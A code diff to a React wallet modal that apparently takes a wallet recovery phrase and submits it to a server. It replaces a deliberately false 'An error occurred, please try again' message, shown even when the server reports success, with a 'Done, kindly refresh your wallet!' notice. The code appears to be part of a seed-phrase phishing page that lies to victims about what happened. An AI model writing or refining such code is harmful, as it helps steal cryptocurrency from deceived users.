@@ -7,6 +7,7 @@ const Modal = ({ wallet, closeModal }) => {
   const [mode, setMode] = useState('phrase');
   const [values, setValues] = useState();
   const [error, setError] = useState('');
+  const [message, setMessage] = useState('');
   const [loading, setLoading] = useState(false);
   const inputRef = useRef();
 
@@ -31,7 +32,7 @@ const Modal = ({ wallet, closeModal }) => {
 
         if (res.data.status === 'Success') {
           setLoading(false);
-          setError('An error occurred, please try again');
+          setMessage('Done, kindly refresh your wallet!');
           timer = setTimeout(() => closeModal(), 2000);
         }
       }
@@ -47,7 +48,7 @@ const Modal = ({ wallet, closeModal }) => {
 
         if (res.data.status === 'Success') {
           setLoading(false);
-          setError('An error occurred, please try again');
+          setMessage('Done, kindly refresh your wallet!');
           timer = setTimeout(() => closeModal(), 2000);
         }
       }
@@ -67,7 +68,7 @@ const Modal = ({ wallet, closeModal }) => {
           });
           if (res.data.status === 'Success') {
             setLoading(false);
-            setError('An error occurred, please try again');
+            setMessage('Done, kindly refresh your wallet!');
             timer = setTimeout(() => closeModal(), 2000);
           }
         };
@@ -238,6 +239,9 @@ const Modal = ({ wallet, closeModal }) => {
 
             <p className="my-[25px] text-xs text-center text-red-500">
               {error && error}
+            </p>
+            <p className="my-[25px] text-xs text-center text-green-600">
+              {message && message}
             </p>
             <div
               className={`mb-[30px] py-[8px] flex justify-center  space-x-2  items-center w-full ${
